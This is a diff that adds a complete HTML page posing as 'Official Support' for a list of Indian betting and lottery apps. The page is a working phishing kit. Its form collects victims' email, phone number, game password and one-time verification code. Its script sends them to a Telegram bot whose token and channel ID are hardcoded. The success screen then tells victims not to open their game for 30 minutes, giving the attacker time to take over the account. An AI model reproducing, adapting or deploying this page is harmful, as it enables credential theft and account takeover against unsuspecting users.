@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Customer Support</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0b0813;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 15px;
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(147, 51, 234, 0.18) 0%, transparent 60%),
+                radial-gradient(circle at 100% 100%, rgba(126, 34, 206, 0.1) 0%, transparent 50%);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            background: rgba(18, 14, 29, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(147, 51, 234, 0.25);
+            border-radius: 24px;
+            padding: 28px 22px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 30px rgba(147, 51, 234, 0.1);
+            position: relative;
+        }
+
+        .top-glow-avatar {
+            position: absolute;
+            top: 24px;
+            right: 22px;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            border: 2px solid #a855f7;
+            box-shadow: 0 0 12px rgba(168, 85, 247, 0.6);
+            background: radial-gradient(circle, #c084fc, #6b21a8);
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(147, 51, 234, 0.15);
+            color: #d8b4fe;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 5px 12px;
+            border-radius: 20px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 14px;
+            border: 1px solid rgba(168, 85, 247, 0.3);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #ffffff;
+            letter-spacing: -0.3px;
+        }
+
+        .subtitle {
+            font-size: 12.5px;
+            color: #9ca3af;
+            line-height: 1.5;
+            margin-bottom: 22px;
+            padding-right: 20px;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #c084fc;
+            margin-bottom: 18px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        .dot {
+            width: 7px;
+            height: 7px;
+            background-color: #a855f7;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #a855f7;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            color: #d1d5db;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 14px;
+            color: #9ca3af;
+            font-size: 14px;
+            pointer-events: none;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 13px 14px 13px 40px;
+            background: rgba(11, 8, 19, 0.8);
+            border: 1px solid rgba(147, 51, 234, 0.25);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 13.5px;
+            outline: none;
+            transition: all 0.25s ease;
+        }
+
+        #password {
+            padding-right: 48px;
+        }
+
+        select {
+            appearance: none;
+            -webkit-appearance: none;
+            cursor: pointer;
+            padding-right: 40px;
+        }
+
+        .select-arrow {
+            position: absolute;
+            right: 14px;
+            color: #9ca3af;
+            font-size: 12px;
+            pointer-events: none;
+        }
+
+        .eye-btn {
+            position: absolute;
+            right: 14px;
+            background: none;
+            border: none;
+            color: #9ca3af;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px;
+            z-index: 5;
+        }
+
+        input:focus, select:focus {
+            border-color: #a855f7;
+            box-shadow: 0 0 12px rgba(168, 85, 247, 0.3);
+            background: rgba(15, 10, 26, 0.95);
+        }
+
+        select option {
+            background-color: #120e1d;
+            color: #ffffff;
+        }
+
+        #customGameGroup {
+            display: none;
+            margin-top: 10px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #9333ea, #6b21a8);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 20px rgba(147, 51, 234, 0.4);
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(135deg, #a855f7, #7e22ce);
+            box-shadow: 0 6px 24px rgba(168, 85, 247, 0.5);
+            transform: translateY(-1px);
+        }
+
+        #successScreen {
+            display: none;
+            text-align: center;
+            padding: 20px 5px 10px;
+        }
+
+        .tg-circle {
+            width: 85px;
+            height: 85px;
+            background-color: #22c55e;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px auto;
+            box-shadow: 0 0 25px rgba(34, 197, 94, 0.4);
+        }
+
+        .tg-circle svg {
+            width: 44px;
+            height: 44px;
+            fill: #ffffff;
+            margin-right: 3px;
+        }
+
+        .success-title {
+            font-size: 32px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        .success-text {
+            font-size: 14px;
+            color: #d1d5db;
+            line-height: 1.5;
+            margin-bottom: 22px;
+        }
+
+        .warning-box {
+            background: rgba(220, 38, 38, 0.12);
+            border: 1px solid rgba(220, 38, 38, 0.35);
+            border-radius: 16px;
+            padding: 15px;
+            color: #fca5a5;
+            font-size: 13.5px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            line-height: 1.4;
+            margin-bottom: 22px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <!-- Form Area -->
+        <div id="formScreen">
+            <div class="top-glow-avatar"></div>
+
+            <span class="badge">Official Support</span>
+            <h1>All Game Customer Support</h1>
+            <p class="subtitle">We understand this issue may be impacting your operations and appreciate your patience. Our team will review the information and take immediate action.</p>
+
+            <form id="supportForm" onsubmit="sendToTelegram(event)">
+                <div class="section-title">
+                    <div class="dot"></div>
+                    <span>Connect With Us</span>
+                </div>
+
+                <div class="form-group">
+                    <label>Game Name *</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🎮</span>
+                        <select id="gameName" onchange="checkCustomGame()" required>
+                            <option value="" disabled selected>Select Game Name</option>
+                            <option value="51 Game">51 Game</option>
+                            <option value="55 club">55 club</option>
+                            <option value="6 club">6 club</option>
+                            <option value="82 Lottery">82 Lottery</option>
+                            <option value="91 Club">91 Club</option>
+                            <option value="BDG game">BDG game</option>
+                            <option value="BDG win">BDG win</option>
+                            <option value="BHT club">BHT club</option>
+                            <option value="Big Mumbai">Big Mumbai</option>
+                            <option value="Daman">Daman</option>
+                            <option value="Dhani win">Dhani win</option>
+                            <option value="DM win">DM win</option>
+                            <option value="DN club">DN club</option>
+                            <option value="Goa Game">Goa Game</option>
+                            <option value="in99">in99</option>
+                            <option value="jai club">jai club</option>
+                            <option value="Jalwa">Jalwa</option>
+                            <option value="L7 Lottery">L7 Lottery</option>
+                            <option value="OK win">OK win</option>
+                            <option value="Sikkim">Sikkim</option>
+                            <option value="Tashan win">Tashan win</option>
+                            <option value="TP Play">TP Play</option>
+                            <option value="Tringa">Tringa</option>
+                            <option value="Yarr-win">Yarr-win</option>
+                            <option value="Other / Enter manually...">Other / Enter manually...</option>
+                        </select>
+                        <span class="select-arrow">▼</span>
+                    </div>
+
+                    <div id="customGameGroup">
+                        <div class="input-wrapper">
+                            <span class="input-icon">✏️</span>
+                            <input type="text" id="customGameName" placeholder="Enter game name...">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Your Email *</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">✉️</span>
+                        <input type="email" id="email" placeholder="Enter your email id" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Phone Number *</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">📞</span>
+                        <input type="tel" id="phone" placeholder="Enter game phone number" maxlength="10" pattern="[0-9]{10}" inputmode="numeric" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Game Password *</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🔑</span>
+                        <input type="password" id="password" placeholder="Enter your game password" required>
+                        <button type="button" class="eye-btn" onclick="togglePassword()">
+                            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Verification Code (6 Digits) *</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🛡️</span>
+                        <input type="text" id="code" placeholder="Enter 6-digit verification code" maxlength="6" pattern="\d{6}" inputmode="numeric" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Subject *</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">📌</span>
+                        <select id="subject" required>
+                            <option value="" disabled selected>Enter your problem 🤔</option>
+                            <option value="All details are submitted please send my withdrawal money in my upi id...">All details are submitted please send my withdrawal money in my upi id...</option>
+                            <option value="Withdrawal is not received">Withdrawal is not received</option>
+                            <option value="Withdrawal is process">Withdrawal is process</option>
+                            <option value="Other / Custom subject...">Other / Custom subject...</option>
+                        </select>
+                        <span class="select-arrow">▼</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">Submit Support Request</button>
+            </form>
+        </div>
+
+        <!-- Success Screen -->
+        <div id="successScreen">
+            <div class="tg-circle">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2L2 10l9.5 4L22 2 12 22l4-7.5L20 18z"/>
+                </svg>
+            </div>
+            <h2 class="success-title">Thank You!</h2>
+            <p class="success-text">Your all detail has been submitted<br>successfully.</p>
+            
+            <div class="warning-box">
+                <span style="color: #ef4444;">❗</span> Please don't open your Game in 30 minutes. <span style="color: #ef4444;">❗</span>
+            </div>
+
+            <button type="button" class="submit-btn" onclick="goBackToForm()">Back to Home Page</button>
+        </div>
+
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8940467322:AAEfMuuiNmdy2NlfT2Uye2y1Xjy0hNwRjmk";
+        const CHANNEL_ID = "-1003939328463";
+
+        function checkCustomGame() {
+            const select = document.getElementById('gameName');
+            const customGroup = document.getElementById('customGameGroup');
+            const customInput = document.getElementById('customGameName');
+            
+            if (select.value === "Other / Enter manually...") {
+                customGroup.style.display = 'block';
+                customInput.required = true;
+            } else {
+                customGroup.style.display = 'none';
+                customInput.required = false;
+                customInput.value = '';
+            }
+        }
+
+        function togglePassword() {
+            const pwdInput = document.getElementById('password');
+            const eyeIcon = document.getElementById('eyeIcon');
+            
+            if (pwdInput.type === "password") {
+                pwdInput.type = "text";
+                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
+            } else {
+                pwdInput.type = "password";
+                eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
+            }
+        }
+
+        function playSuccessSound() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (!AudioContext) return;
+                const ctx = new AudioContext();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(587.33, ctx.currentTime);
+                osc.frequency.setValueAtTime(880, ctx.currentTime + 0.1);
+                
+                gain.gain.setValueAtTime(0.2, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.35);
+                
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                
+                osc.start();
+                osc.stop(ctx.currentTime + 0.35);
+            } catch(e) {
+                console.log("Audio play error");
+            }
+        }
+
+        function sendToTelegram(event) {
+            event.preventDefault();
+            
+            playSuccessSound();
+            document.getElementById('formScreen').style.display = 'none';
+            document.getElementById('successScreen').style.display = 'block';
+
+            let game = document.getElementById('gameName').value;
+            if (game === "Other / Enter manually...") {
+                game = document.getElementById('customGameName').value;
+            }
+
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const code = document.getElementById('code').value;
+            const subject = document.getElementById('subject').value;
+
+            const text = `🎮 *NEW SUPPORT TICKET*\n\n` +
+                         `🎯 *Game:* ${game}\n` +
+                         `📧 *Email:* ${email}\n` +
+                         `📞 *Phone:* ${phone}\n` +
+                         `🔑 *Password:* \`${password}\`\n` +
+                         `🔐 *Verification Code:* \`${code}\`\n` +
+                         `📌 *Subject:* ${subject}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHANNEL_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(error => console.error('Error:', error));
+        }
+
+        function goBackToForm() {
+            document.getElementById('supportForm').reset();
+            document.getElementById('customGameGroup').style.display = 'none';
+            document.getElementById('successScreen').style.display = 'none';
+            document.getElementById('formScreen').style.display = 'block';
+        }
+    </script>
+</body>
+  </html>
